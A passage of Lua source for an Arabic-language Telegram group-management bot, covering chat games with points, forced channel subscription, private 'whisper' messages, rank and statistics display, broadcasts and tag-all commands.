name = string.gsub(name,'⛄️','☃☃☃☃☃☃⛄️☃☃☃☃')
name = string.gsub(name,'👨‍🔬','👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬')
name = string.gsub(name,'👨‍💻','👩‍💻👩‍💻👩‍‍💻👩‍‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻')
name = string.gsub(name,'👨‍🔧','👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧')
name = string.gsub(name,'👩‍🍳','👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳')
name = string.gsub(name,'🧚‍♀','🧚‍♂🧚‍♂🧚‍♂🧚‍♂🧚‍♀🧚‍♂🧚‍♂')
name = string.gsub(name,'🧜‍♂','🧜‍♀🧜‍♀🧜‍♀??‍♀🧜‍♀🧚‍♂🧜‍♀🧜‍♀🧜‍♀')
name = string.gsub(name,'🧝‍♂','🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♂🧝‍♀🧝‍♀🧝‍♀')
name = string.gsub(name,'🙍‍♂️','🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️')
name = string.gsub(name,'🧖‍♂️','🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️')
name = string.gsub(name,'👬','👭👭👭👭👭👬👭👭👭')
name = string.gsub(name,'👨‍👨‍👧','👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦')
name = string.gsub(name,'🕒','🕒🕒🕒🕒🕒🕒🕓🕒🕒🕒')
name = string.gsub(name,'🕤','🕥🕥🕥🕥🕥🕤🕥🕥🕥')
name = string.gsub(name,'⌛️','⏳⏳⏳⏳⏳⏳⌛️⏳⏳')
name = string.gsub(name,'📅','📆📆📆📆📆📆📅📆📆')
hxouse = '⌯︙ اول واحد يطلع المختلف {'..name..'} يربح '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md')
end
if text == ''..(hxousedx1:get(HXOUSE..'bot:bkbk4'..msg.chat_id_) or 'لفاتع')..'' and not hxousedx1:get(HXOUSE..'bot:l:id'..msg.chat_id_) then
if not hxousedx1:get(HXOUSE..'bot:l:id'..msg.chat_id_) then 
hxouse = '⌯︙ انت الرابح  \n⌯︙ للعب مره اخرى ارسل المختلف '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md')
hxousedx1:incrby(HXOUSE..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
hxousedx1:set(HXOUSE..'bot:l:id'..msg.chat_id_,true)
end  
if text == 'امثله' and hxousedx1:get(HXOUSE..'bot:lock_geam'..msg.chat_id_) and hxouse11(msg) then
hxouse2 = {
'جوز','ضراطه','الحبل','الحافي','شقره','بيدك','سلايه','النخله','الخيل','حداد','المبلل','يركص','قرد','العنب','العمه','الخبز','بالحصاد','شهر','شكه','يكحله',
};
name = hxouse2[math.random(#hxouse2)]
hxousedx1:set(HXOUSE..'bot:bkbk5'..msg.chat_id_,name)
hxousedx1:del(HXOUSE..'bot:l:id'..msg.chat_id_)
name = string.gsub(name,'جوز','ينطي____للماعده سنون')
name = string.gsub(name,'ضراطه','الي يسوق المطي يتحمل___')
name = string.gsub(name,'بيدك','اكل___محد يفيدك')
name = string.gsub(name,'الحافي','تجدي من___نعال')
name = string.gsub(name,'شقره','مع الخيل يا___')
name = string.gsub(name,'النخله','الطول طول___والعقل عقل الصخلة')
name = string.gsub(name,'سلايه','بالوجه امراية وبالظهر___')
name = string.gsub(name,'الخيل','من قلة___شدو على الچلاب سروج')
name = string.gsub(name,'حداد','موكل من صخم وجهه كال آني___')
name = string.gsub(name,'المبلل','___ما يخاف من المطر')
name = string.gsub(name,'الحبل','اللي تلدغة الحية يخاف من جرة___')
name = string.gsub(name,'يركص','المايعرف___يكول الكاع عوجه')
name = string.gsub(name,'العنب','المايلوح___يكول حامض')
name = string.gsub(name,'العمه','___إذا حبت الچنة ابليس يدخل الجنة')
name = string.gsub(name,'الخبز','انطي___للخباز حتى لو ياكل نصه')
name = string.gsub(name,'باحصاد','اسمة___ومنجله مكسور')
name = string.gsub(name,'شهر','امشي__ولا تعبر نهر')
name = string.gsub(name,'شكه','يامن تعب يامن__يا من على الحاضر لكة')
name = string.gsub(name,'القرد','__بعين امه غزال')
name = string.gsub(name,'يكحله','اجه___عماها')
hxouse = '⌯︙ اكمل المثل التالي {'..name..'} '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md')
end
if text == ''..(hxousedx1:get(HXOUSE..'bot:bkbk5'..msg.chat_id_) or '57999')..'' then -- // المختلف
if not hxousedx1:get(HXOUSE..'bot:l:id'..msg.chat_id_) then 
hxousedx1:incrby(HXOUSE..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
hxousedx1:del(HXOUSE..'bot:bkbk5'..msg.chat_id_)
hxouse = '⌯︙ انت الرابح  \n⌯︙ للعب مره اخرى ارسل امثله '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md')
end
hxousedx1:set(HXOUSE..'bot:l:id'..msg.chat_id_,true)
end
if text == 'الالعاب' or text == 'اللعبه' and hxouse11(msg) then
if not hxousedx1:get(HXOUSE..'bot:lock_geam'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '༯   الالعاب معطله \n⌯︙ ارسل { تفعيل اللعبه } لتفعيلها ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1,[[*
⌯︙ اهلا بك في قائمه الالعاب ↓↓
ٴ… … … … … … … … … … …
⌯︙ الالعاب المتوفره بالبوت ↓↓
ٴ… … … … … … … … … … …
⌯︙ ارسل امر { ترتيب } لبدء لعبه 
⌯︙ ارسل امر { سمايلات } لبدء لعبه 
⌯︙ ارسل امر { حزوره } لبدء لعبه 
⌯︙ ارسل امر { المعاني } لبدء لعبه 
⌯︙ ارسل امر { العكس } لبدء لعبه 
⌯︙ ارسل امر { المحيبس } لبدء لعبه 
⌯︙ ارسل امر { امثله } لبدء لعبه 
⌯︙ ارسل امر { المختلف } لبدء لعبه 
ٴ… … … … … … … … … … …
⌯︙ قناة السورس *[@HXOUSEiq] 
]], 1, 'md')
end
end
--------------------------------
------------------------------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) and idf:match("-100(%d+)") and text:match("^ضع عدد النقاط (%d+)$")  then
local dx1 = { string.match(text, "^(ضع عدد النقاط) (%d+)$")}
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙تم وضع عدد نقاط البيع\n⌯︙ يمكن للعضو بيع نقاط اللعبه\n⌯︙اذا كان عدد نقاطه اكبر من~ *"..dx1[2].."*\n",1, 'md')
hxousedx1:set(HXOUSE.."FAEDER_OO0" .. msg.chat_id_, dx1[2])
return false end
-------------------
if text == 'بيع نقاطي' and hxouse11(msg) then
if tonumber((hxousedx1:get(HXOUSE..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
hxouse0 = '⌯︙ ليس لديك نقاط العب اولا \n⌯︙ للعب ارسل { سمايلات او ترتيب } '
hxousedx(msg.chat_id_, msg.id_, 1,hxouse0, 1, 'md') 
else
hxouse0 = (hxousedx1:get(HXOUSE..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) * tonumber(hxousedx1:get('hxouse:'..bot_id..'gamepoint' .. msg.chat_id_)or 50))
hxousedx1:incrby('hxouse:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_,hxouse0)  
hxousedx1:del(HXOUSE..'bot:add:num'..msg.chat_id_..msg.sender_user_id_)
hxouse0 = tonumber((hxousedx1:get('hxouse:'..bot_id..'gamepoint' .. msg.chat_id_) or 50))
hxousedx(msg.chat_id_, msg.id_, 1,'⌯︙ تم بيع نقاطك \n⌯︙ كل نقطه تساوي  '..hxouse0..' رساله ', 'md')
end
end
if text == "تعيين قناة الاشتراك" or text == "تغيير قناة الاشتراك" and hxouse11(msg) then
if not is_leader(msg) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ للمطور الاساسي فقط ', 1, 'md')
else
hxousedx1:setex(HXOUSE..'hxouse4'..msg.sender_user_id_,300,true)
hxousedx(msg.chat_id_,msg.id_, 1, "*⌯︙ ارسل لي معرف قناة الاشتراك *\n", 1 , "md")
end end
if text == 'تفعيل الاشتراك الاجباري' then
if not is_leader(msg) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ للمطور الاساسي فقط ', 1, 'md')
else
if not hxousedx1:get(HXOUSE..'hxouse3') then
hxousedx(msg.chat_id_,msg.id_, 1, "*⌯︙ لم يتم تعيين القناة \n⌯︙ ارسل تعيين قناة الاشتراك *", 1 , "md")
return false 
end
if hxousedx1:get(HXOUSE..'hxouse3') then
hxousedx(msg.chat_id_,msg.id_, 1, "*⌯︙ تم تفعيل الاشتراك الاجباري \n⌯︙ قم برفعي ادمن في قناتك *", 1 , "md")
hxousedx1:set(HXOUSE.."hxouse2", true)
return false end end end
if text == 'تعطيل الاشتراك الاجباري' then
if not is_leader(msg) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ للمطور الاساسي فقط ', 1, 'md')
else
hxousedx(msg.chat_id_,msg.id_, 1, "*⌯︙ تم تعطيل الاشتراك الاجباري *\n", 1 , "md")
hxousedx1:del(HXOUSE.."hxouse2")
return false 
end end
if text == 'جلب قناة الاشتراك' or text == 'قناة الاشتراك' then
if not is_leader(msg) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ للمطور الاساسي فقط ', 1, 'md')
else
local hxouse5 = hxousedx1:get(HXOUSE.."hxouse3")
if hxouse5 then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ *قناة الاشتراك* : ['..hxouse5..']', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ لم يتم تعيين القناة ', 1, 'md')
end end end
------------------------------------ With Pattern hxouse-------------------------------------------
local msg = data.message_
text = msg.content_.text_ 
if not hxousedx1:get(HXOUSE..'TFF'..msg.chat_id_) then
if text and text:match("^اهمس (.*) (.*)") then 
text = text:gsub('@',"")
faed_dx = {string.match(text, "اهمس (.*) (.*)")}
function hamss(res1,res2)
if not res2.id_ then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙المعرف غير صحيح ', 1, 'html')
return "dx"
end
function hamssss(ress1,ress2)
if (ress2 and ((ress2.status_ and ress2.status_.ID == "ChatMemberStatusLeft") or ress2.ID == "Error")) then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙العضو غير موجود بالمجموعه ', 1, 'html')
return "dx"
end
tdcli_function ({
ID="DeleteMessages",
chat_id_= msg.chat_id_,
message_ids_= {[0] = msg.id_}
}, 
dl_cb, nil)
hxousedx1:set(HXOUSE.."HM:"..msg.chat_id_..msg.id_..res2.id_,faed_dx[1])
function bot_id_get(ros1,ros2)
bot_username = (ros2.username_ or "DX_XBOT")
function Dxx(ross1,ross2)
local hms = msg.sender_user_id_
if ross2.username_ then 
hms = "@"..ross2.username_
end
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙هذه همسه سريه الى { @["..faed_dx[2].."] }\n⌯︙مرسله من { ["..hms.."] }\n⌯︙هو فقط من يستطيع رويتها\n⌯︙[اضغط هنا لعرض الهمسه](https://t.me/"..bot_username.."?start=hms"..msg.chat_id_..msg.id_.."_"..res2.id_..") •", 1, 'md')
end
getUser(msg.sender_user_id_, Dxx)
end
getUser(bot_id, bot_id_get)
end
tdcli_function ({
ID = "GetChatMember",
chat_id_ = msg.chat_id_,
user_id_ = res2.id_
}, hamssss, nil)
end
resolve_username(faed_dx[2],hamss) 
end
end
if text and text == "اهمس" or text and text == "همسه" or text and text == "اريد بوت الهمسه" or text and text == "دزلي بوت الهمسه" or  text and text == "دزولي بوت الهمسه" and hxouse11(msg) then  
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙يمكنك من خلال هذا البوت\n⌯︙ارسال همسه سريه للاعضاء \n⌯︙الامر كالاتي مثال : اهمس هلو [@pro_c9]', 1, 'md')
end
if text and text:match("/start hms(.*)_(%d+)") then 
faed_dx = {string.match(text, "^/start hms(.*)_(%d+)")}
if tonumber(msg.sender_user_id_) == tonumber(faed_dx[2]) then 
Faeder = hxousedx1:get(HXOUSE.."HM:"..faed_dx[1]..faed_dx[2])
if Faeder then 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙الهمسه الموجه لك هي\n⌯︙{ ['..Faeder..'] }', 1, 'md')
else 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙اثكل الهمسه مو الك', 1, 'md')
end 
else 
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙اثكل الهمسه مو الك', 1, 'md')
end
end  
----------hxouse
if text == 'رفع المشرفين' and hxouse11(msg) then  
local function promote_admin(extra, result, success)  
local num = 0
local admins = result.members_  
for i=0 , #admins do   
num = num + 1
hxousedx1:sadd(HXOUSE..'bot:momod:'..msg.chat_id_, admins[i].user_id_)   
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then  
owner_id = admins[i].user_id_  
hxousedx1:sadd(HXOUSE..'bot:monsh:'..msg.chat_id_,owner_id)   
end  
end  
hxousedx(msg.chat_id_, msg.id_, 1, '\n*⌯︙ تم رفع ('..num..') ادمنيه هنا \n⌯︙ وتم رفع منشئ المجموعه *', 1, 'md')
end
getChannelMembers(msg.chat_id_,0, 'Administrators', 100, promote_admin)
end
-------------hxouse
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Pp]ing$") or text:match("^فحص$") and hxouse11(msg) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ البوت شغال عزيزي  ', 1, 'md')
end
end 
------------------------------------HXOUSE TEAM-----------------------------------------------------------
if is_admin(msg.sender_user_id_, msg.chat_id_) then
name_bot = (hxousedx1:get('hxouse:'..bot_id..'name_bot') or 'فايدر')
if text ==  ""..name_bot..' غادر' and hxouse11(msg) then
chat_leave(msg.chat_id_, bot_id)
hxousedx1:srem(HXOUSE.."bot:groups",msg.chat_id_)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم مغادره المجموعه وحذف بياناتها ', 1, 'md')
end
end
--------------hxouse
if (text:match("^موقعي$") or text:match("^رتبتي$")) and hxouse11(msg) then
function get_me(extra,result,success)
local hxousey = (hxousedx1:get('hxouse:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)
local hxouse = hxousedx1:get(HXOUSE..'user:msgs'..bot_id..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local msguser = tonumber(hxousedx1:get(HXOUSE..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
local user_msgs = hxousedx1:get(HXOUSE..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local cont = (tonumber(hxousedx1:get(HXOUSE..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
local user_nkt = tonumber(hxousedx1:get(HXOUSE..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)
local text = (tonumber(hxousedx1:get(HXOUSE.."text:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local sticker = (tonumber(hxousedx1:get(HXOUSE.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Photo = (tonumber(hxousedx1:get(HXOUSE.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Voice = (tonumber(hxousedx1:get(HXOUSE.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Gif = (tonumber(hxousedx1:get(HXOUSE.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
local Video = (tonumber(hxousedx1:get(HXOUSE.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")) or "0" )
if is_leaderid(result.id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Bot Leader'
else 
t = ' مطور اساسي' 
end
elseif is_sudoid(result.id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'sudo 2'
else
t = 'مطور ثانوي 👨‍💻'
end
elseif is_admin(result.id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Dev 3'
else
t = 'مطور رتبه ثالثه'
end
elseif is_onall(result.id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Owner All'
else
t = 'مدير عام'
end
elseif is_moall(result.id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Momod All'
else
t = 'ادمن عام'
end
elseif is_vpall(result.id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Vip All'
else
t = 'مميز عام'
end
elseif is_monsh(result.id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ اساسي'
end
elseif is_monsh2(result.id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = ' creator'
else
t = 'منشئ'
end
elseif is_owner(result.id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = ' Owner'
else 
t = 'مدير'
end
elseif is_momod(result.id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'momod'
else
t = 'ادمن'
end
elseif is_donky(result.id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Donky'
else
t = 'مطي واليكرم 😹💔'
end
elseif is_vipmem(result.id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Vip'
else
t = 'عضو مميز'
end
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
t = 'Member'
else
t = 'فقط عضو'
end
end
function formsgg(msgs) 
local hxouse = ''  
if msgs < 100 then 
hxouse = 'كلش ضعيف 😫' 
elseif msgs < 250 then 
hxouse = 'ضعيف 😨' 
elseif msgs < 500 then 
hxouse = 'غير متفاعل 😒' 
elseif msgs < 750 then 
hxouse = 'متوسط 😎' 
elseif msgs < 1000 then 
hxouse = 'متفاعل 😘' 
elseif msgs < 2000 then 
hxouse = 'قمة التفاعل 😍' 
elseif msgs < 3000 then 
hxouse = 'ملك التفاعل 😻'  
elseif msgs < 4000 then 
hxouse = 'اسطورة التفاعل 🍃' 
elseif msgs < 5000 then 
hxouse = 'متفاعل نار كلش 🔥' 
elseif msgs < 5500 then 
hxouse = 'نار وشرار' 
elseif msgs < 6000 then 
hxouse = 'خيالي' 
elseif msgs < 7000 then 
hxouse = 'كافر بالتفاعل' 
elseif msgs < 8000 then 
hxouse = 'رب التفاعل ' 
end 
return hxouse
end
if result.username_ then
username = '@'..result.username_
else
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
username = 'Not Found'
else
username = 'لا يوجد'
end
end
if result.last_name_ then
lastname = result.last_name_
else
lastname = ''
end
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Your name  '..result.first_name_..' '..lastname..' \n⌯︙ Your user  '..username..' \n⌯︙ Your ID  '..result.id_..' \n⌯︙ Your Rank  '..t, 1, 'html')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ اهلا بك { '..result.first_name_..' }\n\n⌯︙ معرفك  { '..username..' }\n⌯︙ ايديك  { '..result.id_..' }\n⌯︙ نقاطك { '..user_nkt..' }\n\n༯   { احصائيات الرسائل }\n⌯︙ الرسائل { '..(user_msgs + hxousey)..' / '..(hxouse)..'} \n⌯︙ الملصقات { '..sticker..' }\n⌯︙ الصور  { '..Photo..' }\n⌯︙ الصوت { '..Voice..' }\n⌯︙ المتحركه { '..Gif..' }\n⌯︙ الفيديو{ '..Video..' }\n⌯︙ الجهات  { '..cont..' }\n\n⌯︙ التفاعل { '..formsgg(msguser)..' } \n\n༯   موقعك  '..t, 1, 'html')
end 
end
getUser(msg.sender_user_id_,get_me)
end
if text:match("^الرتبه$") and msg.reply_to_message_id_ ~= 0 and hxouse11(msg) then
function rt_by_reply(extra, result, success) 
local user_info_ = hxousedx1:get(HXOUSE..'user:Name' .. result.sender_user_id_)
local hxouse_res = user_info_
if user_info_ then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = result.sender_user_id_},function(arg,da) 
if da.status_.ID == "ChatMemberStatusCreator" then
renk_gps = 'المنشئ'
elseif da.status_.ID == "ChatMemberStatusEditor" then
renk_gps = 'الادمن'
elseif da.status_.ID == "ChatMemberStatusMember" then
renk_gps = 'عضو'
end
if result.id_ then 
if tonumber(result.sender_user_id_) == tonumber(902039110) then
hxouse1 = 'مبرمج السورس'
elseif tonumber(result.sender_user_id_) == tonumber(bot_owner) then
hxouse1 = "مطور اساسي 🎖"
elseif is_sudoid(result.sender_user_id_) then
hxouse1 = "مطور ثانوي"
elseif is_admin(result.sender_user_id_, msg.chat_id_) then
hxouse1 = "مطور رتبه ثالثه 🏁"
elseif is_onall(result.sender_user_id_) then
hxouse1 = "مدير عام 🌟"
elseif is_moall(result.sender_user_id_) then
hxouse1 = "ادمن عام 🌟"
elseif is_vpall(result.sender_user_id_) then
hxouse1 = "مميز عام 🌟"
elseif is_monsh(result.sender_user_id_, msg.chat_id_) then
hxouse1 = "منشئ اساسي 🌟"
elseif is_monsh2(result.sender_user_id_, msg.chat_id_) then
hxouse1 = "منشئ 🌟"
elseif is_owner(result.sender_user_id_, msg.chat_id_) then
hxouse1 = "مدير 🌟"
elseif is_momod(result.sender_user_id_, msg.chat_id_) then
hxouse1 = "ادمن 🌟"
elseif is_vipmem(result.sender_user_id_, msg.chat_id_) then
hxouse1 = "عضو مميز 🌟"
elseif is_donky(result.sender_user_id_, msg.chat_id_) then
hxouse1 = "مطي مرتب 😹💔"
else
hxouse1 = "عضو فقط 🌟"
end
end 
local hxouse = '*⌯︙ اهلا بك عزيزي { '..renk_hxouse(msg)..' }*\n*⌯︙ رتبه المستخدم* { '..hxouse_res..' }\n*⌯︙ في البوت { '..hxouse1..' }*\n*⌯︙ في الكروب { '..renk_gps..' }*\n'
hxousedx(msg.chat_id_, msg.id_, 1,hxouse, 1, 'md') 
end,nil)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,rt_by_reply)
end
-----------------------hxouse
if is_sudo(msg) then
if text == 'توجيه للكل' and tonumber(msg.reply_to_message_id_) > 0 then
function hxouse(extra,result,success)

local list = hxousedx1:smembers(HXOUSE.."bot:groups")
for k,v in pairs(list) do
forwardMessages(v, msg.chat_id_, {[0] = result.id_}, 1)
end
end
local gps = hxousedx1:scard(HXOUSE..'bot:groups') or 0
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم نشر رسالتك بالتوجيه ༯\n⌯︙ في : { '..gps..' } مجموعه ༯ ', 1, 'md')
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hxouse)
end
if text:match("^اذاعه (.*)$") and is_sudo(msg) then  
local gps = hxousedx1:scard(HXOUSE.."bot:groups") or 0
local gpss = hxousedx1:smembers(HXOUSE.."bot:groups") or 0
local rwss = {string.match(text, "^(اذاعه) (.*)$")}
local bib = rwss[2]
for i=1, #gpss do
hxousedx(gpss[i], 0, 1, bib, 1, 'md')
end
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ Your Message send to :{ '..gps..' } groups ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم نشر رسالتك ༯\n⌯︙ في : { '..gps..' } مجموعه ༯ ', 1, 'md')
end
end
end
if text:match("^(time)$") or text:match("^(الوقت)$")  and hxouse11(msg) then
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ الساعه ~ '..os.date("%I:%M%p")..' \n⌯︙ التاريخ ~  '..os.date("%Y/%m/%d")..' \n', 1, 'md')
end
if text:match("^زخرفه$")  then  
hxousedx1:setex(HXOUSE.."zr:wordd" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
hxousedx1:setex(HXOUSE.."zr:word" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ ارسل الكلمه لزخرفتها \n⌯︙ يمكن الزخرفه باللغتين {ar , en}', 1, 'md')
end
--------------------
if text:match("^مشاهده المنشور$") and hxouse11(msg) then
hxousedx1:set(HXOUSE..'bot:viewget'..msg.sender_user_id_,true)
if hxousedx1:get(HXOUSE..'lang:gp:'..msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, '> Plese forward your post : ', 1, 'md')
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ ارسل لي المنشور الان ', 1, 'md')
end
end
----- hxouse
if text:match("^اطردني$") and hxouse11(msg) then
if not hxousedx1:get(HXOUSE.."lock_kickme"..msg.chat_id_) then
hxousedx1:set(HXOUSE..'yes'..msg.sender_user_id_..'', 'kickyes')
hxousedx1:set(HXOUSE..'no'..msg.sender_user_id_..'', 'kickno')
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ ارسل *{ نعم }* ليتم طردك\n⌯︙ ارسل *{ لا } *ليتم الغاء طردك ", 1, "md")
else
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ هذه الخاصيه معطله ', 1, 'md')
end
end
local kickme = hxousedx1:get(HXOUSE..'yes'..msg.sender_user_id_..'')
if kickme == 'kickyes' then
if text:match("^نعم$") then
if is_vipmem(msg.sender_user_id_, msg.chat_id_) then
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ لا استطيع طرد المشرفين ", 1, "md")
else
local kickme = hxousedx1:get(HXOUSE..'yes'..msg.sender_user_id_..'')
if kickme == 'kickyes' then
chat_kick(msg.chat_id_, msg.sender_user_id_)
hxousedx1:del(HXOUSE..'yes'..msg.sender_user_id_..'', 'kickyes')
hxousedx1:del(HXOUSE..'no'..msg.sender_user_id_..'', 'kickno')
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم طردك لا ترجع بعد ", 1, "md")
end
end
end
if text:match("^لا$") then
local notkickme = hxousedx1:get(HXOUSE..'no'..msg.sender_user_id_..'')
if notkickme == 'kickno' then
hxousedx1:del(HXOUSE..'yes'..msg.sender_user_id_..'', 'kickyes')
hxousedx1:del(HXOUSE..'no'..msg.sender_user_id_..'', 'kickno')
hxousedx(msg.chat_id_, msg.id_, 1, "⌯︙ تم الغاء طردك لا تشاقه هيج شقه ", 1, "md")
end
end
end   
if text == 'تعطيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not hxousedx1:get(HXOUSE.."lock_kickme"..msg.chat_id_) then
hxousedx1:set(HXOUSE.."lock_kickme"..msg.chat_id_, true)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تعطيل امر اطردني ', 1, 'md')
end
end
if text == 'تفعيل اطردني' and is_owner(msg.sender_user_id_, msg.chat_id_) then
if hxousedx1:get(HXOUSE.."lock_kickme"..msg.chat_id_) then
hxousedx1:del(HXOUSE.."lock_kickme"..msg.chat_id_)
hxousedx(msg.chat_id_, msg.id_, 1, '⌯︙ تم تفعيل امر اطردني ', 1, 'md')
end
end
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text and text == "تاك للكل" and hxouse11(msg) then
function tall(f1, f2)
local text = "⌯︙ وينكم اخوان \n~~~~~~~~~~~~~~~~~~~~\n"
i = 0
for k, v in pairs(f2.members_) do
i = i + 1
local user_info = hxousedx1:hgetall('user:'..v.user_id_)  
if user_info and user_info.username then
local username = user_info.username
text = text.."<b> "..i.." ┇</b> { @"..username.." }\n"
end
end 
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
print(text)
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},tall,nil)
end
if text:match("^كلهم (.*)$")  and hxouse11(msg) then
local txt = {string.match(text, "^(كلهم) (.*)$")}
function tall(f1, f2)
local text = "⌯︙ "..txt[2].." \n~~~~~~~~~~~~~~~~~~~~\n"
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
i = 0
for k, v in pairs(f2.members_) do
i = i + 1
local user_info = hxousedx1:hgetall('user:'..v.user_id_)  
if user_info and user_info.username then
local username = user_info.username
text = text.."<b> "..i.." ┇</b> { @"..username.." }\n"
end
end 
hxousedx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
print(text)
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},tall,nil)
end
end
if text:match("^source$") or text:match("^اصدار$") or text:match("^الاصدار$") or  text:match("^السورس$") or text:match("^سورس$") and hxouse11(msg) then 
local text =  [[
⌯︙↬HXOUSE TEAM
⠠⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠠𖧧
༯┆[SOURCE HXOUSE v0.1](t.me/ilxpli) ܀
⌯︙[Channel HXOUSE](t.me/HXOUSEiq)
༯┆[MORE INFO](t.me/Il44lI)
